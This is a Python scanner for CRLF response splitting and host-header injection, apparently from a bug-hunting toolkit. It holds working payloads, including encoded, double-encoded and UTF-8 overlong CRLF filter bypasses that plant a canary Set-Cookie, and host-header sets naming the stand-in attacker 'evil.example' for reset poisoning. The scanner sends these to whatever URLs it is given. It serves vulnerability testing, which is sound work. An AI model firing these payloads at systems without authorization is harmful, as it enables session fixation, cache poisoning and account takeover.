#!/usr/bin/env python3
"""
CRLF / HTTP response-splitting + host-header injection scanner.

Injects carriage-return/line-feed sequences (and their encodings) into the URL
path/query and the Host/forwarding headers, then checks whether an attacker-
controlled header (a canary `Set-Cookie`) appears in the *response* headers —
proof the server reflected our CRLF into the response.

Payload generation and the response classifier are pure and unit-tested; only
`scan()` touches the network.

Why it matters:
  CRLF in a response header -> Set-Cookie injection (session fixation),
  cache poisoning, XSS via injected body, or open-redirect via injected
  Location. Host-header injection -> password-reset poisoning, cache poisoning.

Usage:
  tools/crlf_scanner.py "https://target.com/redirect?url=x"
  tools/crlf_scanner.py -l urls.txt --json
  tools/crlf_scanner.py https://target.com/ --host-header
"""
from __future__ import annotations

import argparse
import json
import os
import sys
import urllib.error
import urllib.request
from dataclasses import dataclass
from pathlib import Path
from urllib.parse import urlparse, urlunparse

_REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _REPO not in sys.path:
    sys.path.insert(0, _REPO)
from tools.safe_http import safe_urlopen  # noqa: E402

USER_AGENT = "agentic-bug-hunter/crlf_scanner"
CANARY = "crlftest"
CANARY_HEADER = "Set-Cookie"


def crlf_payloads(canary: str = CANARY) -> list[str]:
    """Path/query CRLF injection vectors. Each tries to inject a Set-Cookie.

    Covers raw CRLF, encoded CRLF (single/double), LF-only, CR-only, and the
    UTF-8 overlong/normalization bypass (%E5%98%8A / %E5%98%8D) that defeats
    naive \\r\\n filters.
    """
    marker = f"{CANARY_HEADER}:{canary}=1"
    seqs = [
        f"%0d%0a{marker}",          # encoded CRLF
        f"%0a{marker}",             # LF only
        f"%0d{marker}",             # CR only
        f"%23%0d%0a{marker}",       # fragment then CRLF
        f"%250d%250a{marker}",      # double-encoded CRLF
        f"%E5%98%8A%E5%98%8D{marker}",  # UTF-8 overlong CR/LF bypass
        f"\r\n{marker}",            # raw (some libs forward verbatim)
        f"%0d%0a%20{marker}",       # CRLF + leading space (header-fold)
        f"%u000d%u000a{marker}",    # IIS unicode escape
    ]
    return seqs


def detect_injection(resp_headers: dict[str, str], canary: str = CANARY) -> str | None:
    """Return the matched header value if our canary header was injected.

    `resp_headers` is a case-insensitive-ish mapping of response headers.
    """
    want = f"{canary}=1"
    for k, v in resp_headers.items():
        if k.lower() == CANARY_HEADER.lower() and want in (v or "").replace(" ", ""):
            return v
    return None


def host_header_payloads(target_host: str, attacker: str = "evil.example") -> list[dict[str, str]]:
    """Header sets for host-header / forwarding injection (reset poisoning)."""
    return [
        {"Host": attacker},
        {"Host": target_host, "X-Forwarded-Host": attacker},
        {"Host": target_host, "X-Forwarded-Host": attacker, "X-Forwarded-Scheme": "http"},
        {"Host": f"{target_host}\n{CANARY_HEADER}:{CANARY}=1"},  # CRLF in Host
        {"Host": target_host, "X-Host": attacker},
        {"Host": target_host, "Forwarded": f"host={attacker}"},
    ]


@dataclass
class CrlfFinding:
    url: str
    vector: str          # "query" | "host-header"
    payload: str
    evidence: str
    severity: str = "HIGH"

    def as_dict(self) -> dict:
        return {
            "url": self.url, "vector": self.vector, "payload": self.payload,
            "evidence": self.evidence, "severity": self.severity,
        }


def _inject_into_path(url: str, payload: str) -> str:
    """Append the CRLF payload onto the path segment."""
    p = urlparse(url)
    new_path = (p.path or "/").rstrip("/") + "/" + payload
    return urlunparse((p.scheme, p.netloc, new_path, p.params, p.query, ""))


def _send(url: str, extra_headers: dict[str, str] | None, timeout: int) -> dict[str, str]:
    headers = {"User-Agent": USER_AGENT}
    if extra_headers:
        headers.update(extra_headers)
    req = urllib.request.Request(url, headers=headers, method="GET")
    try:
        with safe_urlopen(req, timeout=timeout) as resp:
            return dict(resp.headers.items())
    except urllib.error.HTTPError as e:
        return dict(e.headers.items()) if e.headers else {}
    except (urllib.error.URLError, TimeoutError, ConnectionError, ValueError):
        # ValueError: urllib refuses raw \r\n in URL — that's the lib protecting
        # us; the encoded variants still go out.
        return {}


def scan(url: str, host_header: bool = False, timeout: int = 15) -> list[CrlfFinding]:
    findings: list[CrlfFinding] = []
    for payload in crlf_payloads():
        target = _inject_into_path(url, payload)
        hdrs = _send(target, None, timeout)
        ev = detect_injection(hdrs)
        if ev:
            findings.append(CrlfFinding(target, "query", payload, ev))
    if host_header:
        host = urlparse(url).hostname or ""
        for hset in host_header_payloads(host):
            hdrs = _send(url, hset, timeout)
            ev = detect_injection(hdrs)
            # also flag if attacker host is reflected in Location (reset poisoning)
            loc = next((v for k, v in hdrs.items() if k.lower() == "location"), "")
            if ev:
                findings.append(CrlfFinding(url, "host-header", json.dumps(hset), ev))
            elif "evil.example" in loc:
                findings.append(CrlfFinding(
                    url, "host-header", json.dumps(hset),
                    f"attacker host reflected in Location: {loc}", "MEDIUM",
                ))
    return findings


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description="CRLF / header-injection scanner")
    ap.add_argument("url", nargs="?")
    ap.add_argument("-l", "--list", help="file of URLs")
    ap.add_argument("--host-header", action="store_true",
                    help="also test Host / X-Forwarded-Host injection")
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--json", action="store_true")
    args = ap.parse_args(argv)

    urls: list[str] = []
    if args.list:
        urls += [l.strip() for l in Path(args.list).read_text().splitlines() if l.strip()]
    if args.url:
        urls.append(args.url)
    if not urls:
        ap.error("provide a URL or -l <file>")

    out: list[CrlfFinding] = []
    for u in urls:
        fs = scan(u, host_header=args.host_header, timeout=args.timeout)
        out += fs
        if not args.json:
            if fs:
                for f in fs:
                    print(f"[{f.severity}] CRLF via {f.vector}: {f.url}")
                    print(f"    payload:  {f.payload}")
                    print(f"    evidence: {f.evidence}")
            else:
                print(f"[ok] {u} — no CRLF injection detected")

    if args.json:
        print(json.dumps([f.as_dict() for f in out], indent=2))
    return 2 if out else 0


if __name__ == "__main__":
    sys.exit(main())
